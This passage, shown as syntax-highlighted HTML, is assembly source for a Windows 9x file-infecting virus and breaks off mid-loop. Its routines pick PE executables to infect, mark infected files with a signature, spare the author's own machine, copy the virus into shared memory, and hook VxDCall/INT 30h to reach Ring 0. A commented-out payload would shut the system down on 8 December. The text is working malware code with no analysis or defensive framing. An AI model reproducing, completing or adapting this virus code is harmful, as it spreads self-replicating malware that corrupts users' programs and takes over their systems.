</span><span class="sc1">;      2. File must be a PE</span><span class="sc0">
</span><span class="sc1">;      3. It must not be a DLL</span><span class="sc0">
</span><span class="sc1">;      4. File must not be infected by our virus</span><span class="sc0">
</span><span class="sc1">;      5. It must not be a Winzip Self-Extractor File</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      If all the above conditions are met, this function returns the size, in</span><span class="sc0">
</span><span class="sc1">;      bytes, by which the file and section must be increased when the file is</span><span class="sc0">
</span><span class="sc1">;      infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; DWORD cfbe_szFileName: ASCIIZ Name of the file to check</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: 1 if the file can be infected, 0 Otherwise</span><span class="sc0">
</span><span class="sc1">;   -&gt; EBX: Bytes by which the file size must be increased if it is infected</span><span class="sc0">
</span><span class="sc1">;   -&gt; ECX: Bytes by which the last section size must be increased if it is infected</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;___________________________________________</span><span class="sc0">
</span><span class="sc5">CanFileBeInfected</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">cfbe_szFileName</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc1">;Map File, without increasing the File Size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenAndMapFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cfbe_szFileName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;File Opened &amp; Mapped Successfully</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_CanFileBeInfected</span><span class="sc0">           </span><span class="sc1">;No, Return with Error Code = 0</span><span class="sc0">

</span><span class="sc1">;Get File Headers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileHeaders</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;Successfully retreived file headers</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">End_CanFileBeInfected</span><span class="sc0">           </span><span class="sc1">;No, probably not a PE file</span><span class="sc0">

</span><span class="sc1">;Check if file is infected. We use the Win32VersionValue for storing our signature</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">])</span><span class="sc5">.IOH_Win32VersionValue</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUS_SIGNATURE</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Error_CanFileBeInfected</span><span class="sc0">         </span><span class="sc1">;File is already infected</span><span class="sc0">

</span><span class="sc1">;Check if file is a DLL</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">])</span><span class="sc5">.IFH_Characteristics</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Error_CanFileBeInfected</span><span class="sc0">         </span><span class="sc1">;Yes</span><span class="sc0">

</span><span class="sc1">;Check if last section is sharable</span><span class="sc0">
    </span><span class="sc1">;mov        edx, (IMAGE_SECTION_HEADER [ecx]).ISH_Characteristics</span><span class="sc0">
    </span><span class="sc1">;and        edx, IMAGE_SCN_MEM_SHARED       ;Is Section Sharable</span><span class="sc0">
    </span><span class="sc1">;jnz        Error_CanFileBeInfected         ;Yes, don't infect</span><span class="sc0">

</span><span class="sc1">;Don't infect Winzip Self-Extractor Files.</span><span class="sc0">
    </span><span class="sc1">;The last section of this file has the name _winzip_. Note that Winzip</span><span class="sc0">
    </span><span class="sc1">;Self-Extrator Personal Edition Files will still be infected, since they</span><span class="sc0">
    </span><span class="sc1">;don't have this section</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">])</span><span class="sc5">.ISH_Name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"niw_"</span><span class="sc0">     </span><span class="sc1">;"_win" ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_CanFileBeInfected</span><span class="sc0">                                     </span><span class="sc1">;Yes, dont infect</span><span class="sc0">

</span><span class="sc1">;OK, File can be infected, Great !!, ;-)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">;Image Optional Header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">])</span><span class="sc5">.IOH_FileAlignment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">])</span><span class="sc5">.IOH_SectionAlignment</span><span class="sc0">

</span><span class="sc1">;Calculate Increase in Section size</span><span class="sc0">
    </span><span class="sc1">;INC_SEC_SIZE = [(VIRUS_SIZE - 1 + SECTION_ALIGN) / SECTION_ALIGN] * SECTION_ALIGN</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">;Add Section Alignment</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">;We need to divide only EAX</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;Divide by SECTION_ALIGN</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;Multiply by SECTION_ALIGN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;Save Increase in Section Size</span><span class="sc0">

</span><span class="sc1">;Calculate Increase in File Size</span><span class="sc0">
    </span><span class="sc1">;INC_FILE_SIZE = (INC_SEC_SIZE - 1 + FILE_ALIGN) / FILE_ALIGN] * FILE_ALIGN</span><span class="sc0">
    </span><span class="sc1">;mov        eax, VIRUS_SIZE;**NEW LINE</span><span class="sc0">
    </span><span class="sc1">;dec        eax                         ;INC_SEC_SIZE - 1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;Add File Alignment, FILE_ALIGN</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;Divide by FILE_ALIGN</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;Multiply by FILE_ALIGN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;Save Increase in File Size</span><span class="sc0">

</span><span class="sc1">;Close the file, and return relevant values</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapAndCloseFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cfbe_szFileName</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;Get Increase in File Size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;Get Increase in Section Size</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;Return Code 1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">End_CanFileBeInfected</span><span class="sc0">

</span><span class="sc5">Error_CanFileBeInfected</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapAndCloseFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cfbe_szFileName</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Return Code 0</span><span class="sc0">

</span><span class="sc5">End_CanFileBeInfected</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CanFileBeInfected</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            PayLoad                                     | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function is called on the 8th of December. It delievers the Payload</span><span class="sc0">
</span><span class="sc1">;      of the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;___________</span><span class="sc0">
</span><span class="sc1">;PayLoad PROC</span><span class="sc0">
</span><span class="sc1">;   @DELTA  esi</span><span class="sc0">
</span><span class="sc1">;   ;call   ExitWindowsEx, EWX_FORCE OR EWX_SHUTDOWN, NULL</span><span class="sc0">
</span><span class="sc1">;   call    esi + ExitWindowsEx, EWX_SHUTDOWN, NULL</span><span class="sc0">
</span><span class="sc1">;   ret</span><span class="sc0">
</span><span class="sc1">;PayLoad ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                       CanMachineBeInfected                             | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function is called to check if the virus should infect this machine</span><span class="sc0">
</span><span class="sc1">;      or not. This is used, so that the virus doesn't infect My Machine !!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: 0 -&gt; machine should not be infected, else it can be infected</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;________________________</span><span class="sc0">
</span><span class="sc5">CanMachineBeInfected</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;Check if the "No Infect" file exists on the current machine</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szNoInfectFileName</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">   </span><span class="sc1">;File Opened ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">End_CanMachineBeInfected</span><span class="sc0">    </span><span class="sc1">;No, so machine can be infected</span><span class="sc0">

</span><span class="sc1">;Close the file, and return 0, since its probably my machine</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;return 0, so that machine is not infected</span><span class="sc0">

</span><span class="sc5">End_CanMachineBeInfected</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CanMachineBeInfected</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            RelocateVirus                               | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function allocates memory in the Shared area and copies the Virus</span><span class="sc0">
</span><span class="sc1">;      to that area.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: Base address of Memory where the Virus was copied, or NULL if an</span><span class="sc0">
</span><span class="sc1">;      error occured.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;_________________</span><span class="sc0">
</span><span class="sc5">RelocateVirus</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">dwDeltaOffset</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwMemoryRegion</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;Reserve Shared Memory</span><span class="sc0">
    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PageReserve</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PR_SHARED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUS_SIZE_PAGES</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">           </span><span class="sc1">;Memory Allocate Successfully?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_RelocateVirus</span><span class="sc0">                 </span><span class="sc1">;No</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SHARED_MEMORY</span><span class="sc0">                  </span><span class="sc1">;Shared memory Allocated?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Error_RelocateVirus</span><span class="sc0">                 </span><span class="sc1">;No</span><span class="sc0">

</span><span class="sc1">;Save Address of Region</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwMemoryRegion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;Commit Shared Memory</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">                            </span><span class="sc1">;Page Number</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PageCommit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUS_SIZE_PAGES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PD_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> \
                     </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PC_PRESENT</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PC_FIXED</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_RelocateVirus</span><span class="sc0">

</span><span class="sc1">;Copy Virus to Newly Allocate Memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwDeltaOffset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc0">        </span><span class="sc1">;Start Copying From Here</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwMemoryRegion</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;Copy Here</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUS_SIZE</span><span class="sc0">                     </span><span class="sc1">;Size to Copy</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwMemoryRegion</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;Return Region of Shared Memory Allocated</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">End_RelocateVirus</span><span class="sc0">

</span><span class="sc5">Error_RelocateVirus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;Return 0, since an error occured</span><span class="sc0">

</span><span class="sc5">End_RelocateVirus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RelocateVirus</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                      InstallHookProcedure                              | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function installs a hook procedure to monitor VxDCalls</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;________________________</span><span class="sc0">
</span><span class="sc5">InstallHookProcedure</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">       </span><span class="sc5">dwDeltaOffset</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;Modify the JMP instruction, so that it points to the address of OldInt30</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldInt30Address</span><span class="sc0">     </span><span class="sc1">;Bytes to modify</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldInt30</span><span class="sc0">            </span><span class="sc1">;Address of OldInt30</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                      </span><span class="sc1">;Modify JMP instruction</span><span class="sc0">

</span><span class="sc1">;The disassembly of the VxDCall function looks like this:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;8B 44 24 04                MOV     EAX, DWORD PTR [ESP+04h]</span><span class="sc0">
</span><span class="sc1">;8F 04 24                   POP     DWORD PTR [ESP]</span><span class="sc0">
</span><span class="sc1">;2E FF 1D XX XX XX XX       CALL    FWORD PTR CS:[XXXXXXXX]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The last instuction points to an INT 30h instruction that is used by</span><span class="sc0">
</span><span class="sc1">;VxDCall to jump to Ring 0. So, to hook VxDCall's, we must modify the</span><span class="sc0">
</span><span class="sc1">;address pointed to by the CALL, i.e. XXXXXX, so that it points to our</span><span class="sc0">
</span><span class="sc1">;code. Before that, we should save the current address, so that we can</span><span class="sc0">
</span><span class="sc1">;call the old INT 30h</span><span class="sc0">

</span><span class="sc1">;Trace through VxDCall, until we come to the XXXXXXXX bytes</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDCall</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;First byte of VxDCall function</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">                     </span><span class="sc1">;Scan upto 50 bytes</span><span class="sc0">
</span><span class="sc5">TraceVxDCall</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                               </span><span class="sc1">;Get current byte</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">                     </span><span class="sc1">;First byte of CALL instruction?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">TraceVxDCall_NextByte</span><span class="sc0">       </span><span class="sc1">;No, check next byte</span><span class="sc0">
